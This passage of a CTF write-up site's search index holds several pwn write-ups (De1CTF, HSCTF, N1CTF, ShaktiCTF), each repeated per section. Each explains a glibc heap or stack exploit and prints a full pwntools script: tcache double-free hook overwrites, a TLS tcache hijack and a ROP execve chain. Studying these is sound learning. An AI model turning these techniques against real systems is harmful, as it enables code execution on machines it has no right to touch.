r.recvuntil('Enter your password:') r.sendline('B' 26 + p32(0xdeadbeef) + 'B' 12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0)) r.interactive() ```","title":"python program : (cotinuation)"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#flag-udctf0bl1g4t0ry_buff3r_ov3rflow","text":"","title":"Flag: UDCTF{0bl1g4t0ry_buff3r_ov3rflow}"},{"location":"pwning/De1CTF20/stl/","text":"STL_Container Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> 1 1. add 2. delete 3. show >> 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks. Getting the Leaks I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak! Final Exploit I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter(\">>\",str(ds)) r.sendlineafter(\">>\",str(opt)) if(opt == 1): r.sendlineafter(\"input data:\",value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter(\"index?\\n\",str(idx)) if(ds ==2): print(\"lol\") print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64((\"\\x70\"+r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split(\": \")[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#stl_container","text":"Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> 1 1. add 2. delete 3. show >> 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks.","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#getting-the-leaks","text":"I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak!","title":"Getting the Leaks"},{"location":"pwning/De1CTF20/stl/#final-exploit","text":"I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter(\">>\",str(ds)) r.sendlineafter(\">>\",str(opt)) if(opt == 1): r.sendlineafter(\"input data:\",value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter(\"index?\\n\",str(idx)) if(ds ==2): print(\"lol\") print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64((\"\\x70\"+r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split(\": \")[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"Final Exploit"},{"location":"pwning/HSCTF20/studysim/","text":"Studysim This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep > Add Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added. Do Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7fc6760 0x0000000000000000 0x404030 <stdin@@GLIBC_2.2.5>: 0x00007ffff7fc5a00 0x0000000000000000 0x404040 <allocated_count>: 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 <stack>: 0x0000000000000000 0x0000000000000000 0x404070 <stack+16>: 0x0000000000000000 0x0000000000000000 0x404080 <stack+32>: 0x0000000000000000 0x0000000000000000 0x404090 <stack+48>: 0x0000000000000000 0x0000000000000000 Sleep Well, it just sleeps and exits. Nothing interesting here. Getting the Leaks To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. > For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 <-- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 <-- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 <-- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000 Final Exploit By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process(\"./studysim\",env = {\"LD_PRELOAD\" : \"./libc.so.6\"}) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(size)) k.sendlineafter(\"worksheet?\\n\",content) def do(count): k.sendlineafter(\"> \",\"do\") k.sendlineafter(\"finish?\\n\",str(count)) def sleep(): k.sendlineafter(\"> \",\"sleep\") stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil(\"Only \") heap_leak = int(k.recvline().strip().split(\" \")[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",'a') k.recvuntil(\"worksheet \") leak = k.recvline().strip().split(\" \")[0].replace(\"'\",\"\") leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",p64(one_gadget)) do(2) #call system k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",'0') k.interactive()","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#studysim","text":"This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep >","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#add","text":"Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added.","title":"Add"},{"location":"pwning/HSCTF20/studysim/#do","text":"Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7fc6760 0x0000000000000000 0x404030 <stdin@@GLIBC_2.2.5>: 0x00007ffff7fc5a00 0x0000000000000000 0x404040 <allocated_count>: 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 <stack>: 0x0000000000000000 0x0000000000000000 0x404070 <stack+16>: 0x0000000000000000 0x0000000000000000 0x404080 <stack+32>: 0x0000000000000000 0x0000000000000000 0x404090 <stack+48>: 0x0000000000000000 0x0000000000000000","title":"Do"},{"location":"pwning/HSCTF20/studysim/#sleep","text":"Well, it just sleeps and exits. Nothing interesting here.","title":"Sleep"},{"location":"pwning/HSCTF20/studysim/#getting-the-leaks","text":"To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. > For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 <-- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 <-- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 <-- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000","title":"Getting the Leaks"},{"location":"pwning/HSCTF20/studysim/#final-exploit","text":"By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process(\"./studysim\",env = {\"LD_PRELOAD\" : \"./libc.so.6\"}) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(size)) k.sendlineafter(\"worksheet?\\n\",content) def do(count): k.sendlineafter(\"> \",\"do\") k.sendlineafter(\"finish?\\n\",str(count)) def sleep(): k.sendlineafter(\"> \",\"sleep\") stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil(\"Only \") heap_leak = int(k.recvline().strip().split(\" \")[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",'a') k.recvuntil(\"worksheet \") leak = k.recvline().strip().split(\" \")[0].replace(\"'\",\"\") leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",p64(one_gadget)) do(2) #call system k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",'0') k.interactive()","title":"Final Exploit"},{"location":"pwning/N1CTF20/easywrite/","text":"EasyWrite The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started! Initial Click All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy. What did not work? On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy. Crux: Controlling Tcache We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 . What happened next? Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) => system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed. Exploit from pwn import * p = process(\"./easy\",env = {\"LD_PRELOAD\" : \"./libc-2.31.so\"}) p.recvuntil(\"Here is your gift:\") leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info(\"libc_start = \" + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter(\"Input your message:\",fake_tcache) p.sendafter(\"Where to write?:\",p64(tls_tcache)) p.sendafter(\"Any last message?:\",\"/bin/sh\\x00\"+p64(system)) p.interactive()","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#easywrite","text":"The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started!","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#initial-click","text":"All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy.","title":"Initial Click"},{"location":"pwning/N1CTF20/easywrite/#what-did-not-work","text":"On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy.","title":"What did not work?"},{"location":"pwning/N1CTF20/easywrite/#crux-controlling-tcache","text":"We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 .","title":"Crux: Controlling Tcache"},{"location":"pwning/N1CTF20/easywrite/#what-happened-next","text":"Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) => system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed.","title":"What happened next?"},{"location":"pwning/N1CTF20/easywrite/#exploit","text":"from pwn import * p = process(\"./easy\",env = {\"LD_PRELOAD\" : \"./libc-2.31.so\"}) p.recvuntil(\"Here is your gift:\") leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info(\"libc_start = \" + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter(\"Input your message:\",fake_tcache) p.sendafter(\"Where to write?:\",p64(tls_tcache)) p.sendafter(\"Any last message?:\",\"/bin/sh\\x00\"+p64(system)) p.interactive()","title":"Exploit"},{"location":"pwning/ShakitCTF21/intro/","text":"ShaktiCTF April 2021 Birdie Singal dROPper Returning2 Cache7","title":"ShaktiCTF April 2021"},{"location":"pwning/ShakitCTF21/intro/#shaktictf-april-2021","text":"Birdie Singal dROPper Returning2 Cache7","title":"ShaktiCTF April 2021"},{"location":"pwning/ShakitCTF21/returning2/","text":"ShaktiCTF'21: Returning 2 Author: Shruti (@rudyerudite) This was a fairly beginner friendly challenge with a clear 120-byte overflow. We also see an alloca function which is used to allocate space on the stack. I gave an allocation of -40 so that I get the allocation at RBP. Note that PIE is diasbled here. By using ROPgadget tool we can find the required ROP gadgets for crafting the exploit payload. As '/bin/sh' cannot be found in the binary and nor we can write it at .bss, thus we have to find and address in binary with permissions rw . I chose to overwrite an address in the .data section. You can see the permissions of different sections in the binary by executing vmmap in GDB and finding the required address. Thus, I used the mov QWORD PTR [rdi],rax gadget with rax having the string '/bin/sh' and rdi pointing to the address 0x601040 . Next, we can do the execve syscall. Here's the final exploit for the challenge: from pwn import * r = process(\"./chall\") pop_rax = p64(0x000000000040079a) pop_rdx = p64(0x0000000000400788) pop_rdi = p64(0x000000000040077f) pop_rsi = p64(0x0000000000400791) mov = p64(0x400774) syscall = p64(0x00000000004007a3) exp = 'a'*0x8 exp += pop_rdi + p64(0x0000000000601040) exp += pop_rax + \"/bin/sh\\x00\" exp += mov exp += pop_rsi + p64(0) exp += pop_rdx + p64(0) exp += pop_rax + p64(0x3b) exp += syscall exp += p64(0x000000000040059e) print(len(exp)) r.sendline(str(-40)) r.sendlineafter(\"text:\\n\",exp) r.interactive()","title":"ShaktiCTF'21: Returning 2"},{"location":"pwning/ShakitCTF21/returning2/#shaktictf21-returning-2","text":"Author: Shruti (@rudyerudite) This was a fairly beginner friendly challenge with a clear 120-byte overflow. We also see an alloca function which is used to allocate space on the stack. I gave an allocation of -40 so that I get the allocation at RBP. Note that PIE is diasbled here. By using ROPgadget tool we can find the required ROP gadgets for crafting the exploit payload. As '/bin/sh' cannot be found in the binary and nor we can write it at .bss, thus we have to find and address in binary with permissions rw . I chose to overwrite an address in the .data section. You can see the permissions of different sections in the binary by executing vmmap in GDB and finding the required address. Thus, I used the mov QWORD PTR [rdi],rax gadget with rax having the string '/bin/sh' and rdi pointing to the address 0x601040 . Next, we can do the execve syscall. Here's the final exploit for the challenge: from pwn import * r = process(\"./chall\") pop_rax = p64(0x000000000040079a) pop_rdx = p64(0x0000000000400788) pop_rdi = p64(0x000000000040077f) pop_rsi = p64(0x0000000000400791) mov = p64(0x400774) syscall = p64(0x00000000004007a3) exp = 'a'*0x8 exp += pop_rdi + p64(0x0000000000601040) exp += pop_rax + \"/bin/sh\\x00\" exp += mov exp += 